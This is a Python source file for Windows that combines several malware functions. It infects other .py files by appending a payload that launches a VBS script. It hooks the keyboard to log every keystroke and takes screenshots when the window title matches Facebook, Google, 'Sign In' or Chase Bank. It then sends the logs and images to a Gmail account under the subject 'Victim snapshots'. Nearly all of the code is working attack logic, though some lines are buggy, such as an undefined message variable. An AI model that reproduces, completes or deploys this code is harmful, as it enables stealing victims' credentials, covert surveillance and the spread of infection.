#!/usr/bin/python

import platform,socket, base64, time, urllib2,datetime,os,sys,subprocess
import ImageGrab,pythoncom, pyHook,win32api, win32con, win32gui, Image,smtplib
from threading import Timer
from threading import Thread
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# Screenshot Settings#
Screen_logs = []                            # list that contains matches for taking automated screenshots
Screen_logs.append("Facebook")              # Checks for facebook in the title bar
Screen_logs.append("Sign In")               # Sign In found in common email login page
Screen_logs.append("Google")
Screen_logs.append("Chase Bank")            # Similarly bank websites
Screenshots_flag = True                     # set to True to take screenshot(s)
Screenshots_count = 5                       # set amount of screenshot to take.
Screenshots_interval = 2                    # interval between each screenshot.


# Email Settings#
Mail_subject = 'Victim snapshots'           # email subject
Mail_message = 'Victim details'             # email content 
Sendmail_flag = True                        # set to True to send emails
Mail_ID = 'test@gmail.com'                  # account email address 
Mail_password = 'lukeskywalker'             # email's password 
Mail_from = 'test@gmail.com'   




# System Settings              
log_active = ''                 # stores active window
Keylog_state = False            # Start keylogger as false
log_time = 200                  # amount of time to log in seconds
Text_log = ""                   # this is the raw log var which will be written to file
Textsize_log = 0                # marks the beginning and end of new text blocks that separate logs
log_minterval = 86400           # main loop intervals in seconds, where 86400 = 1 day 
log_filename = 'tmpConf.txt'    # log file that is created in the current directory
ToSend_log = []                 # contains files to send in email attachment

LOG_THREAD_keylog = 0           # thread count for keylogger
LOG_THREAD_screenshot = 0       # thread count for automated screenshots


SIGNATURE="flash"
string1=' '*700000000

def scanpy():                       #files ending with .py and keeps adding them to the list pfiles,here we mentioned a dummy folder to infect
    pfiles=[]                       #os.walk('C:\\') to infect .py files in C drive,similarly can be done for other system drives 
    for root,dirs,files in os.walk('C:\\test\\Nsec'):
        for file in files:
            if file.endswith('.py'):
                pfiles.append(os.path.join(root,file))
    return pfiles

def searchpy(path):                     #searchpy finds all the python files in the current directory in which this program is executed and adds them to filestoinfect list
    filestoinfect = []                  #list to maintain the files to infect
    filelist = os.listdir(path)         #Searches for all the files and directories in the path
    for fname in filelist:              #Iterate through the files and directory list
        if os.path.isdir(path+"\\"+fname): #Check to see if filelist has any directories,if it is a directory we have to iterate through the files in the directories
            filestoinfect.extend(searchpy(path+"\\"+fname)) #The path of the directory is passed to search again to iterate through the files in the directory found
        elif fname[-3:] == ".py":  #check for .py extension
            infected = False
            for line in open(path+"\\"+fname):
                if SIGNATURE in line:
                    infected = True
                    break
            if infected == False:
             filestoinfect.append(path+"\\"+fname)# add it to filestoinfect list
    return filestoinfect

def infectpy(filestoinfect):   #infectpy writes the content of the payload file in to all the files in the infection list
    virus = open('payload.txt','w')
    virus.write("import os\n")
    virus.write("os.startfile(\""+str(os.getcwd())+"\\\\" + "payload.vbs\")")
    virus.close()
    virus = open('payload.txt','r')
    virusstring=virus.read()
    virus.close()
    for fname in filestoinfect:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write(temp + virusstring)
        f.close()
        
filestoinfect = searchpy(os.path.abspath(""))# call to scan all python files in the current directory and add them to infectionlist
filestoinfect.extend(scanpy())              # call to scan python files in all directories and add them to the infection list
infectpy(filestoinfect)                  # call to infect the files in the infection list with the payload contents

main_id = win32api.GetCurrentThreadId()     # set the thread ID before execution.

       
def Keytracker(k,log_time,log_filename):
                
                
                global Text_log, log_file, Keylog_state, log_active, main_id    # make use of the global variables
                Keylog_state = True                                             # set to true to begin logging
                main_id = win32api.GetCurrentThreadId()                         # windows API to get current thread ID
                
                Text_log += "\n--------------------------------------------------\n"
                LOG_DATE = datetime.datetime.now()                              # logging the date and time
                Text_log += ' ' + str(LOG_DATE) + ' *****Logging started********|\n'
                Text_log += "------------------------------------------------------\n\n"
                appwindow = win32gui #app window 
                log_active = appwindow.GetWindowText(appwindow.GetForegroundWindow())   # to get the window text of the program running in the foreground
                LOG_DATE = datetime.datetime.now()
                Text_log += "******Window activated ******** [" + str(LOG_DATE) + "] \n"
                Text_log += "----" * len(log_active) + "------\n"
                Text_log += " " + log_active + " |\n"                                   # logs the active window text in the log file
                Text_log += "----" * len(log_active) + "------\n\n"  
                if log_time > 0:
                        t = Timer(log_time,stopKeytracker)                              # incase the keytracker is set for certain time duration, this calls stopKeytracker afer that duration
                        t.start()
                # open file to write
                
                log_file = open(log_filename,'w')                                       # opens tmfConf.txt in write mode
                log_file.write(Text_log)
                log_file.close()
                hookobj = pyHook.HookManager()                                          # pyhook, creation of Hook manager object to provide callbacks with regard to keyboard events.
                hookobj.KeyDown = OnKeyboardEvent                                       # on keydown event calls onKeyboardEvent handler
                hookobj.HookKeyboard()
                #Programs that want to receive notifications of global input events must have a Windows message pump. The PumpMessages() method in the Win32 Extensions package for Python is used for this purpose.
                pythoncom.PumpMessages() 
                #Adding timestamps after loogging completion, incase a fixed logging time is specified
                log_file = open(log_filename, 'a')
                Text_log += "\n\n-------------------------------------------\n"
                LOG_DATE = datetime.datetime.now()
                Text_log += " " + str(LOG_DATE) + ' *********Logging finished*************** |\n' 
                Text_log += "------------------------------------------------\n"
                Keylog_state = False #Keylog_state is set to false
                try: 
                                    log_file.write(Text_log)
                                    log_file.close()
                except:
                                    log_file.close()
                return True
        



# Function in which the actual tracking of keystrokes take place,the keydown event handler      
def OnKeyboardEvent(event):
                global Keylog_state, LOG_THREAD_screenshot
                
                if Keylog_state == False: return True
                global Text_log, log_file, log_filename, log_active, Screenshots_interval, Screenshots_flag, Screenshots_count
                Text_log = ""
                log_file = open(log_filename, 'a')
                # check for new window activation
                wingui = win32gui
                LOG_NEWACTIVE = wingui.GetWindowText (wingui.GetForegroundWindow())
                if LOG_NEWACTIVE != log_active:                                         # if the current new windows is not same as the active window,log the activity
                                
                                LOG_DATE = datetime.datetime.now()
                                Text_log += "\n\n**** Window activated********[" + str(LOG_DATE) + "] \n"
                                Text_log += "--" * len(LOG_NEWACTIVE) + "---\n"
                                Text_log += " " + LOG_NEWACTIVE + " |\n"
                                Text_log += "--" * len(LOG_NEWACTIVE) + "---\n\n"
                                log_active = LOG_NEWACTIVE                              # set the new window as the currently active window

                                # Screenshots_flag is set to true intially,to capture images of user activity
                                if Screenshots_flag == True:
                                    LOG_IMG = 0
                                    while LOG_IMG < len(Screen_logs):                                   # check to see if the images in Screen_logs are iterated
                                        if LOG_NEWACTIVE.find(Screen_logs[LOG_IMG]) > 0:                # if the new active window is the one present in the Screen_logs ,start logging
                                            Text_log += "**** Taking " + str(Screenshots_count) + " screenshot for \"" + Screen_logs[LOG_IMG] + "\" match.\n"
                                            Text_log += "**** Timestamp: " + str(datetime.datetime.now()) + "\n\n"
                                            #thread is spawned to call method takeScreenshots which passing the no.of shots to be taken and interval between the shots as argument
                                            screenshot_thread = Thread(target=takeScreenshots, args=(LOG_THREAD_screenshot,Screenshots_count,Screenshots_interval))
                                            screenshot_thread.start()                                  # start thread
                                            LOG_THREAD_screenshot += 1                                 # add 1 to the thread counter
                                        LOG_IMG += 1
                                log_file.write(Text_log)                                               #write content from raw log file to the file tmpconf.txt
        
                Text_log = ""   
                if event.Ascii == 8: Text_log += "\b"                                                   # handling backspace character
                elif event.Ascii == 13 or event.Ascii == 9: Text_log += "\n"                            # handling of new line character
                else: Text_log += str(chr(event.Ascii)) 
                # write to file
                log_file.write(Text_log) 
                log_file.close()
        
                return True

def stopKeytracker():
                win32api.PostThreadMessage(main_id, win32con.WM_QUIT, 0, 0);                            # win32api is used to stop the keylogging and to allow the main thread to contine

# take multiple screenshots function
# args = number of shots, interval between shots
def takeScreenshots(i,maxShots,intShots):
                shot = 0
                while shot < maxShots:
                                shottime = time.strftime('%Y_%m_%d_%H_%M_%S')
                                Screenshot()
                                time.sleep(intShots)
                                shot += 1
# screenshot function
def Screenshot():
            
                img=ImageGrab.grab()                                                    # to grab the image
                saveas=os.path.join(time.strftime('%Y_%m_%d_%H_%M_%S')+'.png')          # save in the year,month,day,hour,minutes and second format
                img.save(saveas)                                                        #save image
                if Sendmail_flag == True:                                               # send mail set to true
                                addFile = str(os.getcwd()) + "\\" + str(saveas) 
                                ToSend_log.append(addFile)                              # add to the list ToSend_log list ,keeps track of all files to send as email


        

# send email function
# server = smtplib.SMTP('smtp.gmail.com:587')
def sendEmail():
                
                #setting of the various email parameters
                emailmsg = MIMEMultipart()
                emailmsg['Subject'] = Mail_subject
                emailmsg['From'] = Mail_from
                emailmsg['To'] = Mail_ID
                emailmsg.preamble = Mail_message
                # attach each file in ToSend_log list  
                for file in ToSend_log:
                                # attach text file
                                if file[-4:] == '.txt':
                                    fp = open(file)
                                    attach = MIMEText(fp.read())
                                    fp.close()
                                # attach images
                                elif file[-4:] == '.png':
                                    fp = open(file, 'rb')
                                    attach = MIMEImage(fp.read())
                                    fp.close()
                                attach.add_header('Content-Disposition', 'attachment; filename="%s"' % os.path.basename(file))
                                emailmsg.attach(attach)
            
                emailserver = smtplib.SMTP('smtp.gmail.com:587')
                emailserver.starttls()  
                emailserver.login(Mail_ID, Mail_password)
                emailserver.sendmail(Mail_from, Mail_ID, msg.as_string())  
                emailserver.quit()

# function to clean up files in case the kylogger runs infinitely
def deleteFiles():
                
                if len(ToSend_log) < 1: return True
                for file in ToSend_log:
                                os.unlink(file)
        
            
        
        
    

keytracking = Thread(target=Keytracker,args=(LOG_THREAD_keylog,log_time,log_filename)) # thread to call the keytracker function
keytracking.start()                                                                    #start thread
            
# keylogging is running infinitely incase log_time < 0
if log_time < 1:
    
        # begin continuous loop
            while True:
                        time.sleep(log_minterval)                                       # sleep for time specified
                
                        LOG_NEWFILE = time.strftime('%Y_%m_%d_%H_%M_%S') + ".txt"
                # add file to the ToSend_log list
                        if Sendmail_flag == True:
                            addFile = str(os.getcwd()) + "\\" + str(LOG_NEWFILE)
                            ToSend_log.append(addFile) # add to the list
                
                        LOG_SAVEFILE = open(LOG_NEWFILE, 'w')
                        LOG_CHCKSIZE = open(log_filename, 'r')
                        LOG_SAVEFILE.write(LOG_CHCKSIZE.read())
                        LOG_CHCKSIZE.close()
                        try:
                            LOG_SAVEFILE.write(LOG_SAVETEXT)
                            LOG_SAVEFILE.close()
                        except:
                            LOG_SAVEFILE.close()
                
                        # send email
                        if Sendmail_flag == True:
                            sendEmail()
                            time.sleep(6)
                            deleteFiles()
                        ToSend_log = [] # clear this list
                
                
            # otherwise sleep for specified time, then break program
elif log_time > 0:
                
                    # sleep for time specified
                    time.sleep(log_time)
                    time.sleep(2)
                    # check to send email
                    if Sendmail_flag == True:
                        addFile = str(os.getcwd()) + "\\" + str(log_filename)
                        ToSend_log.append(addFile) # add to the list
                        sendEmail()
                    time.sleep(2)

sys.exit()

